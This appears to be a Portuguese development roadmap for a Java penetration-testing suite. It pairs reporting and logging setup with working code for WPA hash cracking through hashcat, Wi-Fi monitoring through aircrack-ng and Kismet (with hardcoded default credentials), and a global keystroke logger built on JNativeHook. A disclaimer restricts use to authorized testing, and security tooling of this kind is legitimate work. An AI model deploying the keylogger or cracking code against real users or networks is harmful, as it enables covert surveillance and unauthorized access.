# Roadmap de Integração - Ferramentas Profissionais

## Quick Reference Guide

Este documento fornece um guia rápido para integração de ferramentas profissionais no Cyber Security Suite.

---

## 📋 Checklist de Migração Prioritária

### 🔴 **Prioridade CRÍTICA** (Implementar Primeiro)

#### 1. WiFi Scanner → Aircrack-ng Suite
```bash
# Instalação
sudo apt install aircrack-ng

# Teste
airodump-ng --help
```

**Dependência Maven:**
```xml
<!-- Não há lib Java direta, usar ProcessBuilder otimizado -->
<dependency>
    <groupId>org.apache.commons</groupId>
    <artifactId>commons-exec</artifactId>
    <version>1.3</version>
</dependency>
```

**Código de Integração:**
```java
@Service
public class AircrackAdapter {
    
    public void startMonitoring(String iface) {
        CommandLine cmdLine = new CommandLine("airodump-ng");
        cmdLine.addArgument("--output-format");
        cmdLine.addArgument("csv");
        cmdLine.addArgument("--write");
        cmdLine.addArgument("/tmp/scan");
        cmdLine.addArgument(iface + "mon");
        
        DefaultExecutor executor = new DefaultExecutor();
        executor.setStreamHandler(new PumpStreamHandler(outputStream));
        executor.execute(cmdLine, new ExecuteResultHandler() {
            @Override
            public void onProcessComplete(int exitValue) {
                log.info("Scan completed");
            }
            
            @Override
            public void onProcessFailed(ExecuteException e) {
                log.error("Scan failed", e);
            }
        });
    }
}
```

#### 2. Password Cracking → Hashcat

```bash
# Instalação
sudo apt install hashcat

# Teste GPU
hashcat -I
```

**Integração:**
```java
@Service
public class HashcatAdapter {
    
    public void crackWPA(String hashFile, String wordlist, 
                         Consumer<CrackProgress> progressCallback) {
        
        CommandLine cmdLine = new CommandLine("hashcat");
        cmdLine.addArgument("-m"); cmdLine.addArgument("22000");
        cmdLine.addArgument("-a"); cmdLine.addArgument("0");
        cmdLine.addArgument("-w"); cmdLine.addArgument("3");
        cmdLine.addArgument("--status");
        cmdLine.addArgument("--status-timer=1");
        cmdLine.addArgument(hashFile);
        cmdLine.addArgument(wordlist);
        
        // Execute e parse output em tempo real
        DefaultExecutor executor = new DefaultExecutor();
        PumpStreamHandler streamHandler = new PumpStreamHandler(
            new LineOutputStream() {
                @Override
                protected void processLine(String line, int level) {
                    if (line.contains("Speed.#")) {
                        progressCallback.accept(parseProgress(line));
                    }
                }
            }
        );
        executor.setStreamHandler(streamHandler);
        executor.execute(cmdLine);
    }
}
```

#### 3. Keylogger → JNativeHook

**Dependência Maven:**
```xml
<dependency>
    <groupId>com.github.kwhat</groupId>
    <artifactId>jnativehook</artifactId>
    <version>2.2.2</version>
</dependency>
```

**Substituição Completa:**
```java
@Service
public class ProfessionalKeyloggerService implements NativeKeyListener {
    
    private final Queue<KeystrokeEvent> eventBuffer = new ConcurrentLinkedQueue<>();
    
    @PostConstruct
    public void initialize() {
        try {
            // Disable library logging
            Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
            logger.setLevel(Level.OFF);
            
            // Register hook
            GlobalScreen.registerNativeHook();
            GlobalScreen.addNativeKeyListener(this);
            
            log.info("Keylogger initialized successfully");
        } catch (NativeHookException e) {
            log.error("Failed to initialize keylogger", e);
        }
    }
    
    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        KeystrokeEvent event = new KeystrokeEvent(
            System.currentTimeMillis(),
            NativeKeyEvent.getKeyText(e.getKeyCode()),
            getModifiersText(e.getModifiers())
        );
        
        eventBuffer.offer(event);
        
        // Process async
        processEvent(event);
    }
    
    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        // Handle if needed
    }
    
    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
        // Handle if needed
    }
    
    @PreDestroy
    public void cleanup() {
        try {
            GlobalScreen.unregisterNativeHook();
        } catch (NativeHookException e) {
            log.error("Failed to cleanup keylogger", e);
        }
    }
}
```

---

### 🟡 **Prioridade ALTA** (Próximos Passos)

#### 4. Network Analysis → pcap4j

**Dependência Maven:**
```xml
<dependency>
    <groupId>org.pcap4j</groupId>
    <artifactId>pcap4j-core</artifactId>
    <version>1.8.2</version>
</dependency>
<dependency>
    <groupId>org.pcap4j</groupId>
    <artifactId>pcap4j-packetfactory-static</artifactId>
    <version>1.8.2</version>
</dependency>
```

**Exemplo de Uso:**
```java
@Service
public class PacketAnalyzerService {
    
    public void capturePackets(String iface, int packetCount) 
            throws PcapNativeException, NotOpenException {
        
        PcapNetworkInterface nif = Pcaps.getDevByName(iface);
        
        PcapHandle handle = nif.openLive(
            65536,                      // snaplen
            PromiscuousMode.PROMISCUOUS, 
            10                          // timeout (ms)
        );
        
        // Set filter (e.g., WiFi only)
        handle.setFilter("wlan", BpfCompileMode.OPTIMIZE);
        
        PacketListener listener = packet -> {
            if (packet.contains(Dot11Packet.class)) {
                Dot11Packet dot11 = packet.get(Dot11Packet.class);
                analyzeWiFiPacket(dot11);
            }
        };
        
        handle.loop(packetCount, listener);
        handle.close();
    }
    
    private void analyzeWiFiPacket(Dot11Packet packet) {
        // Analyze beacon frames, probe requests, etc.
        log.info("WiFi packet: {}", packet);
    }
}
```

#### 5. WiFi Monitoring → Kismet REST API

**Instalação:**
```bash
sudo apt install kismet
sudo systemctl start kismet
```

**Integração via REST:**
```java
@Service
public class KismetService {
    
    private final RestTemplate restTemplate;
    private static final String KISMET_URL = "http://localhost:2501";
    
    public KismetService() {
        this.restTemplate = createAuthenticatedRestTemplate();
    }
    
    public List<WiFiDevice> getAllDevices() {
        String url = KISMET_URL + "/devices/views/all/devices.json";
        
        DevicesResponse response = restTemplate.getForObject(
            url, 
            DevicesResponse.class
        );
        
        return response.getDevices().stream()
            .filter(d -> "Wi-Fi AP".equals(d.getType()))
            .map(this::mapToWiFiDevice)
            .collect(Collectors.toList());
    }
    
    public WiFiDevice getDeviceDetails(String deviceKey) {
        String url = KISMET_URL + "/devices/by-key/" + deviceKey + "/device.json";
        return restTemplate.getForObject(url, WiFiDevice.class);
    }
    
    private RestTemplate createAuthenticatedRestTemplate() {
        RestTemplate template = new RestTemplate();
        
        template.getInterceptors().add((request, body, execution) -> {
            String auth = "kismet:kismet"; // Default credentials
            byte[] encodedAuth = Base64.getEncoder().encode(auth.getBytes());
            String authHeader = "Basic " + new String(encodedAuth);
            request.getHeaders().set("Authorization", authHeader);
            return execution.execute(request, body);
        });
        
        return template;
    }
}
```

#### 6. Reporting → Apache POI + iText

**Dependências Maven:**
```xml
<!-- Excel Reports -->
<dependency>
    <groupId>org.apache.poi</groupId>
    <artifactId>poi-ooxml</artifactId>
    <version>5.2.3</version>
</dependency>

<!-- PDF Reports -->
<dependency>
    <groupId>com.itextpdf</groupId>
    <artifactId>itext7-core</artifactId>
    <version>7.2.5</version>
</dependency>
```

**Geração de Relatório Excel:**
```java
@Service
public class ExcelReportService {
    
    public void generateScanReport(List<WiFiNetwork> networks, String outputPath) 
            throws IOException {
        
        try (XSSFWorkbook workbook = new XSSFWorkbook()) {
            XSSFSheet sheet = workbook.createSheet("WiFi Scan Results");
            
            // Header style
            CellStyle headerStyle = workbook.createCellStyle();
            Font headerFont = workbook.createFont();
            headerFont.setBold(true);
            headerFont.setFontHeightInPoints((short) 12);
            headerStyle.setFont(headerFont);
            headerStyle.setFillForegroundColor(IndexedColors.GREY_25_PERCENT.getIndex());
            headerStyle.setFillPattern(FillPatternType.SOLID_FOREGROUND);
            
            // Header row
            Row headerRow = sheet.createRow(0);
            String[] headers = {"SSID", "BSSID", "Security", "Signal", "Channel", "Frequency"};
            for (int i = 0; i < headers.length; i++) {
                Cell cell = headerRow.createCell(i);
                cell.setCellValue(headers[i]);
                cell.setCellStyle(headerStyle);
            }
            
            // Data rows
            int rowNum = 1;
            for (WiFiNetwork network : networks) {
                Row row = sheet.createRow(rowNum++);
                row.createCell(0).setCellValue(network.getSsid());
                row.createCell(1).setCellValue(network.getBssid());
                row.createCell(2).setCellValue(network.getSecurityLevel());
                row.createCell(3).setCellValue(network.getSignalStrength());
                row.createCell(4).setCellValue(network.getChannel());
                row.createCell(5).setCellValue(network.getFrequency());
            }
            
            // Auto-size columns
            for (int i = 0; i < headers.length; i++) {
                sheet.autoSizeColumn(i);
            }
            
            // Write to file
            try (FileOutputStream out = new FileOutputStream(outputPath)) {
                workbook.write(out);
            }
        }
    }
}
```

**Geração de Relatório PDF:**
```java
@Service
public class PdfReportService {
    
    public void generatePentestReport(PentestResults results, String outputPath) 
            throws IOException {
        
        try (PdfWriter writer = new PdfWriter(outputPath);
             PdfDocument pdf = new PdfDocument(writer);
             Document document = new Document(pdf)) {
            
            // Title
            document.add(new Paragraph("WiFi Penetration Test Report")
                .setFontSize(24)
                .setBold()
                .setTextAlignment(TextAlignment.CENTER));
            
            // Metadata
            document.add(new Paragraph("Generated: " + LocalDateTime.now())
                .setFontSize(10)
                .setTextAlignment(TextAlignment.CENTER));
            
            document.add(new Paragraph("\n"));
            
            // Summary
            document.add(new Paragraph("Executive Summary")
                .setFontSize(18)
                .setBold());
            
            document.add(new Paragraph(String.format(
                "Total Networks Scanned: %d\nVulnerable Networks: %d\nCritical Findings: %d",
                results.getTotalNetworks(),
                results.getVulnerableNetworks(),
                results.getCriticalFindings()
            )));
            
            // Detailed findings table
            Table table = new Table(UnitValue.createPercentArray(new float[]{3, 3, 2, 2, 2}));
            table.setWidth(UnitValue.createPercentValue(100));
            
            // Headers
            table.addHeaderCell("SSID");
            table.addHeaderCell("BSSID");
            table.addHeaderCell("Security");
            table.addHeaderCell("Signal");
            table.addHeaderCell("Status");
            
            // Data
            for (WiFiNetwork network : results.getNetworks()) {
                table.addCell(network.getSsid());
                table.addCell(network.getBssid());
                table.addCell(network.getSecurityLevel());
                table.addCell(String.valueOf(network.getSignalStrength()));
                table.addCell(network.isVulnerable() ? "VULNERABLE" : "Secure");
            }
            
            document.add(table);
        }
    }
}
```

---

### 🟢 **Prioridade MÉDIA** (Melhorias Futuras)

#### 7. Metrics → Micrometer + Prometheus

**Dependências Maven:**
```xml
<dependency>
    <groupId>io.micrometer</groupId>
    <artifactId>micrometer-core</artifactId>
    <version>1.11.4</version>
</dependency>
<dependency>
    <groupId>io.micrometer</groupId>
    <artifactId>micrometer-registry-prometheus</artifactId>
    <version>1.11.4</version>
</dependency>
```

**Configuração:**
```java
@Configuration
public class MetricsConfig {
    
    @Bean
    public MeterRegistry meterRegistry() {
        return new PrometheusMeterRegistry(PrometheusConfig.DEFAULT);
    }
    
    @Bean
    public CybersecMetrics cybersecMetrics(MeterRegistry registry) {
        return new CybersecMetrics(registry);
    }
}

@Component
public class CybersecMetrics {
    
    private final Counter wifiScansTotal;
    private final Counter attacksTotal;
    private final Gauge activeProcesses;
    private final Timer scanDuration;
    
    public CybersecMetrics(MeterRegistry registry) {
        this.wifiScansTotal = Counter.builder("cybersec.wifi.scans.total")
            .description("Total WiFi scans performed")
            .register(registry);
        
        this.attacksTotal = Counter.builder("cybersec.attacks.total")
            .tag("type", "bruteforce")
            .description("Total attacks performed")
            .register(registry);
        
        this.activeProcesses = Gauge.builder("cybersec.processes.active", 
                processManager, ProcessManager::getActiveProcessCount)
            .description("Number of active processes")
            .register(registry);
        
        this.scanDuration = Timer.builder("cybersec.scan.duration")
            .description("WiFi scan duration")
            .register(registry);
    }
    
    public void recordScan() {
        wifiScansTotal.increment();
    }
    
    public void recordAttack(String type) {
        Counter.builder("cybersec.attacks.total")
            .tag("type", type)
            .register(registry)
            .increment();
    }
    
    public <T> T timeScan(Supplier<T> operation) {
        return scanDuration.record(operation);
    }
}
```

#### 8. Logging → SLF4J + Logback + ELK Integration

**Logback Configuration (logback-spring.xml):**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    
    <!-- Console appender -->
    <appender name="CONSOLE" class="ch.qos.logback.core.ConsoleAppender">
        <encoder>
            <pattern>%d{HH:mm:ss.SSS} [%thread] %-5level %logger{36} - %msg%n</pattern>
        </encoder>
    </appender>
    
    <!-- File appender with rotation -->
    <appender name="FILE" class="ch.qos.logback.core.rolling.RollingFileAppender">
        <file>logs/cybersec.log</file>
        <rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy">
            <fileNamePattern>logs/cybersec.%d{yyyy-MM-dd}.log</fileNamePattern>
            <maxHistory>30</maxHistory>
            <totalSizeCap>1GB</totalSizeCap>
        </rollingPolicy>
        <encoder>
            <pattern>%d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level %logger{36} - %msg%n</pattern>
        </encoder>
    </appender>
    
    <!-- Logstash appender for ELK -->
    <appender name="LOGSTASH" class="net.logstash.logback.appender.LogstashTcpSocketAppender">
        <destination>localhost:5000</destination>
        <encoder class="net.logstash.logback.encoder.LogstashEncoder">
            <customFields>{"app_name":"CyberSecSuite","environment":"production"}</customFields>
        </encoder>
    </appender>
    
    <!-- Audit logger (separate file) -->
    <appender name="AUDIT" class="ch.qos.logback.core.rolling.RollingFileAppender">
        <file>logs/audit.log</file>
        <rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy">
            <fileNamePattern>logs/audit.%d{yyyy-MM-dd}.log</fileNamePattern>
            <maxHistory>365</maxHistory>
        </rollingPolicy>
        <encoder>
            <pattern>%d{yyyy-MM-dd HH:mm:ss.SSS} | %msg%n</pattern>
        </encoder>
    </appender>
    
    <!-- Audit logger -->
    <logger name="AUDIT" level="INFO" additivity="false">
        <appender-ref ref="AUDIT"/>
        <appender-ref ref="LOGSTASH"/>
    </logger>
    
    <!-- Root logger -->
    <root level="INFO">
        <appender-ref ref="CONSOLE"/>
        <appender-ref ref="FILE"/>
        <appender-ref ref="LOGSTASH"/>
    </root>
    
</configuration>
```

**Audit Logger Service:**
```java
@Service
public class AuditLogger {
    
    private static final Logger AUDIT_LOG = LoggerFactory.getLogger("AUDIT");
    
    public void logUserAction(String action, String resource, String result) {
        AUDIT_LOG.info("ACTION={} | RESOURCE={} | RESULT={} | USER={} | IP={} | TIMESTAMP={}",
            action,
            resource,
            result,
            getCurrentUser(),
            getCurrentIp(),
            Instant.now()
        );
    }
    
    public void logSecurityEvent(String eventType, String details) {
        AUDIT_LOG.warn("SECURITY_EVENT={} | DETAILS={} | TIMESTAMP={}",
            eventType,
            details,
            Instant.now()
        );
    }
    
    public void logToolExecution(String tool, String args, String result) {
        AUDIT_LOG.info("TOOL_EXEC={} | ARGS={} | RESULT={} | TIMESTAMP={}",
            tool,
            maskSensitiveData(args),
            result,
            Instant.now()
        );
    }
}
```

---

## 🎯 Timeline de Implementação

### **Sprint 1 (Semana 1-2): Fundação**
- [x] Adicionar dependências Maven
- [ ] Implementar AircrackAdapter
- [ ] Implementar HashcatAdapter
- [ ] Migrar para JNativeHook
- [ ] Testes básicos

### **Sprint 2 (Semana 3-4): Network & Analysis**
- [ ] Integrar pcap4j
- [ ] Implementar KismetService
- [ ] Melhorar WiFiScanner com múltiplos backends
- [ ] Testes de integração

### **Sprint 3 (Semana 5-6): Reporting & Metrics**
- [ ] Implementar Excel reports (Apache POI)
- [ ] Implementar PDF reports (iText)
- [ ] Adicionar Micrometer metrics
- [ ] Dashboard de métricas

### **Sprint 4 (Semana 7-8): Logging & Observability**
- [ ] Configurar Logback avançado
- [ ] Integrar ELK Stack
- [ ] Implementar AuditLogger robusto
- [ ] Dashboards Kibana

### **Sprint 5+ (Futuro): Advanced Features**
- [ ] Metasploit RPC integration
- [ ] Bettercap API integration
- [ ] Automated vulnerability scanning
- [ ] Machine Learning para detecção de anomalias

---

## 📦 Dependências Maven Completas

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project>
    <!-- ... existing config ... -->
    
    <dependencies>
        <!-- Existing dependencies... -->
        
        <!-- ===== NETWORK & PACKET ANALYSIS ===== -->
        <dependency>
            <groupId>org.pcap4j</groupId>
            <artifactId>pcap4j-core</artifactId>
            <version>1.8.2</version>
        </dependency>
        <dependency>
            <groupId>org.pcap4j</groupId>
            <artifactId>pcap4j-packetfactory-static</artifactId>
            <version>1.8.2</version>
        </dependency>
        <dependency>
            <groupId>dnsjava</groupId>
            <artifactId>dnsjava</artifactId>
            <version>3.5.2</version>
        </dependency>
        
        <!-- ===== PROCESS MANAGEMENT ===== -->
        <dependency>
            <groupId>org.apache.commons</groupId>
            <artifactId>commons-exec</artifactId>
            <version>1.3</version>
        </dependency>
        <dependency>
            <groupId>com.zaxxer</groupId>
            <artifactId>nuprocess</artifactId>
            <version>2.0.6</version>
        </dependency>
        
        <!-- ===== KEYLOGGING ===== -->
        <dependency>
            <groupId>com.github.kwhat</groupId>
            <artifactId>jnativehook</artifactId>
            <version>2.2.2</version>
        </dependency>
        
        <!-- ===== CRYPTOGRAPHY ===== -->
        <dependency>
            <groupId>org.bouncycastle</groupId>
            <artifactId>bcprov-jdk15on</artifactId>
            <version>1.70</version>
        </dependency>
        <dependency>
            <groupId>org.bouncycastle</groupId>
            <artifactId>bcpkix-jdk15on</artifactId>
            <version>1.70</version>
        </dependency>
        
        <!-- ===== REPORTING ===== -->
        <dependency>
            <groupId>org.apache.poi</groupId>
            <artifactId>poi-ooxml</artifactId>
            <version>5.2.3</version>
        </dependency>
        <dependency>
            <groupId>com.itextpdf</groupId>
            <artifactId>itext7-core</artifactId>
            <version>7.2.5</version>
        </dependency>
        
        <!-- ===== METRICS & MONITORING ===== -->
        <dependency>
            <groupId>io.micrometer</groupId>
            <artifactId>micrometer-core</artifactId>
            <version>1.11.4</version>
        </dependency>
        <dependency>
            <groupId>io.micrometer</groupId>
            <artifactId>micrometer-registry-prometheus</artifactId>
            <version>1.11.4</version>
        </dependency>
        
        <!-- ===== LOGGING ===== -->
        <dependency>
            <groupId>net.logstash.logback</groupId>
            <artifactId>logstash-logback-encoder</artifactId>
            <version>7.4</version>
        </dependency>
        
        <!-- ===== UTILITIES ===== -->
        <dependency>
            <groupId>commons-io</groupId>
            <artifactId>commons-io</artifactId>
            <version>2.13.0</version>
        </dependency>
        <dependency>
            <groupId>org.apache.commons</groupId>
            <artifactId>commons-lang3</artifactId>
            <version>3.13.0</version>
        </dependency>
        <dependency>
            <groupId>org.apache.commons</groupId>
            <artifactId>commons-text</artifactId>
            <version>1.10.0</version>
        </dependency>
        
        <!-- ===== HTTP CLIENT ===== -->
        <dependency>
            <groupId>com.squareup.okhttp3</groupId>
            <artifactId>okhttp</artifactId>
            <version>4.11.0</version>
        </dependency>
        
    </dependencies>
</project>
```

---

## 🔧 Configuração de Ferramentas Externas

### Kismet Setup
```bash
# Instalar
sudo apt install kismet

# Configurar (kismet.conf)
sudo nano /etc/kismet/kismet.conf

# Adicionar:
source=wlan0
httpd_username=kismet
httpd_password=kismet

# Iniciar
sudo systemctl start kismet
```

### Aircrack-ng Setup
```bash
# Instalar suite completa
sudo apt install aircrack-ng

# Testar interface em modo monitor
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Verificar
iwconfig
```

### Hashcat Setup
```bash
# Instalar
sudo apt install hashcat

# Verificar GPU (NVIDIA/AMD)
hashcat -I

# Benchmark
hashcat -b
```

### ELK Stack Setup (Docker)
```bash
# docker-compose.yml
version: '3'
services:
  elasticsearch:
    image: docker.elastic.co/elasticsearch/elasticsearch:8.10.0
    environment:
      - discovery.type=single-node
    ports:
      - 9200:9200
  
  logstash:
    image: docker.elastic.co/logstash/logstash:8.10.0
    ports:
      - 5000:5000
    volumes:
      - ./logstash.conf:/usr/share/logstash/pipeline/logstash.conf
  
  kibana:
    image: docker.elastic.co/kibana/kibana:8.10.0
    ports:
      - 5601:5601
```

---

## 📚 Recursos e Documentação

### Tutoriais Essenciais
- **Aircrack-ng:** https://www.aircrack-ng.org/doku.php?id=tutorial
- **Hashcat:** https://hashcat.net/wiki/doku.php?id=example_hashes
- **JNativeHook:** https://github.com/kwhat/jnativehook/wiki
- **pcap4j:** https://www.pcap4j.org/

### Comunidades
- **Aircrack-ng Forum:** https://forum.aircrack-ng.org/
- **Hashcat Forum:** https://hashcat.net/forum/
- **r/netsec:** https://reddit.com/r/netsec
- **HackTheBox:** https://www.hackthebox.com/

---

## ⚖️ Aviso Legal

**USO EXCLUSIVO PARA:**
- ✅ Pesquisa acadêmica
- ✅ Ambientes de teste autorizados
- ✅ Equipamentos próprios
- ✅ Com permissão por escrito

**PROIBIDO:**
- ❌ Uso não autorizado
- ❌ Ataques a terceiros
- ❌ Violação de leis locais/internacionais

**O desenvolvedor NÃO se responsabiliza por uso indevido.**

---

**Última atualização:** Outubro 2024  
**Versão:** 1.0
